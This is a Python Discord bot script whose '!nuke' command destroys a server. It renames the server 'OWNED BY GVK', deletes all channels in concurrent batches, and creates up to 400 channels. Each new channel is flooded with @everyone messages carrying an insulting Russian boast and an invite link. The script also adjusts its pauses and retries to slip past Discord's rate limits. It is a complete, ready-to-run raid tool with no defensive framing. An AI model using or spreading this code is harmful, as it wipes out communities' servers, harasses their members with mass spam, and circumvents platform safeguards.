import discord
from discord.ext import commands
import asyncio
import time

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

channel_counter = 0
start_time = 0
rate_limit_hits = 0

@bot.event
async def on_ready():
    print(f'✅ {bot.user} готов к уничтожению')

@bot.command()
async def nuke(ctx):
    global channel_counter, start_time, rate_limit_hits
    channel_counter = 0
    start_time = time.time()
    rate_limit_hits = 0
    
    await ctx.send("**nonerp ebet**")
    
    guild = ctx.guild
    
    try:
        await guild.edit(name="OWNED BY GVK")
        print("✅ Название изменено")
    except:
        print("❌ Не удалось изменить название")
    
    print("🗑️ Удаление каналов...")
    
    deleted = 0
    skipped = 0
    channels = list(guild.channels)
    total = len(channels)
    
    async def delete_channels_batch(batch):
        nonlocal deleted, skipped
        tasks = []
        for channel in batch:
            tasks.append(delete_single_channel(channel))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result is True:
                deleted += 1
            elif result is False:
                skipped += 1
    
    async def delete_single_channel(channel):
        try:
            await channel.delete()
            return True
        except:
            return False
    
    batch_size = 10
    for i in range(0, total, batch_size):
        batch = channels[i:i+batch_size]
        await delete_channels_batch(batch)
        
        if (i // batch_size) % 3 == 0:
            await asyncio.sleep(0.05)
        else:
            await asyncio.sleep(0.01)
        
        if (i + batch_size) % 50 == 0:
            print(f"   📦 Удалено {min(i+batch_size, total)}/{total} каналов")
    
    print(f"📊 Каналы: удалено {deleted}, пропущено {skipped}")
    
    await asyncio.sleep(1)
    
    print("🔥 СОЗДАНИЕ КАНАЛОВ...")
    
    SPAM_TEXT = """@everyone
**ТРАХНУТЫ BY GVK**

https://discord.gg/3B3yEVwGb5

ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ЦАРЯМИ GVK
"""
    
    created = 0
    failed = 0
    target_channels = 400
    
    async def create_channel_batch(batch_num):
        nonlocal created, failed
        tasks = []
        
        for j in range(8):
            i = batch_num * 8 + j
            if i >= target_channels:
                break
            tasks.append(create_single_channel(i))
        
        if not tasks:
            return
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result is True:
                created += 1
            else:
                failed += 1
    
    async def create_single_channel(i):
        global channel_counter, rate_limit_hits
        
        try:
            ch = await guild.create_text_channel(f"gvk-nuked-{i+1}")
            
            messages = [ch.send(SPAM_TEXT) for _ in range(5)]
            await asyncio.gather(*messages)
            
            channel_counter += 1
            
            if channel_counter % 10 == 0:
                elapsed = time.time() - start_time
                speed = channel_counter / elapsed if elapsed > 0 else 0
                print(f"📊 [{channel_counter}] {speed:.1f}/сек")
            
            return True
            
        except discord.Forbidden:
            print(f"❌ Нет прав на канал {i+1}")
            return False
        except discord.HTTPException as e:
            if "rate" in str(e).lower():
                rate_limit_hits += 1
                wait_time = min(rate_limit_hits * 0.08, 0.4)
                print(f"⚠️ Rate limit #{rate_limit_hits}, жду {wait_time:.1f}с")
                await asyncio.sleep(wait_time)
                return await create_single_channel(i)
            else:
                print(f"❌ Ошибка: {e}")
                return False
        except Exception as e:
            print(f"❌ Ошибка: {e}")
            return False
    
    batch_size = 8
    max_batches = target_channels // batch_size + 1
    last_speed_check = time.time()
    speed_samples = []
    
    for batch_num in range(max_batches):
        await create_channel_batch(batch_num)
        
        elapsed = time.time() - start_time
        current_speed = channel_counter / elapsed if elapsed > 0 else 0
        
        if current_speed < 6:
            pause = 0.03
        elif current_speed < 7:
            pause = 0.05
        else:
            pause = 0.08
        
        if rate_limit_hits > 10:
            pause += 0.03
        
        await asyncio.sleep(pause)
        
        if time.time() - last_speed_check > 2:
            speed_samples.append(current_speed)
            if len(speed_samples) > 5:
                speed_samples.pop(0)
            avg_speed = sum(speed_samples) / len(speed_samples)
            print(f"⚡ Средняя скорость: {avg_speed:.1f}/сек")
            last_speed_check = time.time()
        
        if created >= target_channels:
            print(f"✅ Достигнута цель: {created} каналов")
            break
        
        if created % 50 == 0 and created > 0:
            elapsed = time.time() - start_time
            speed = created / elapsed if elapsed > 0 else 0
            print(f"📊 ПРОГРЕСС: {created}/{target_channels} ({speed:.1f}/сек)")
    
    print("\n" + "="*50)
    print("💀 НЬЮК ЗАВЕРШЁН 💀")
    print(f"✅ Создано каналов: {created}")
    print(f"✅ Сообщений отправлено: {created * 5}")
    print(f"❌ Ошибок: {failed}")
    print(f"⏱️ Время: {time.time() - start_time:.1f} сек")
    print(f"📊 Скорость: {created / (time.time() - start_time):.1f} каналов/сек")
    print(f"⚠️ Rate limit попаданий: {rate_limit_hits}")
    print("="*50)
    
    try:
        await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\nСоздано: {created} каналов\nСообщений: {created * 5}\nСкорость: {created / (time.time() - start_time):.1f}/сек")
    except:
        pass

@bot.command()
async def status(ctx):
    await ctx.send("🔥 Бот активен! Используй !nuke")

import os
bot.run(os.environ['TOKEN'])
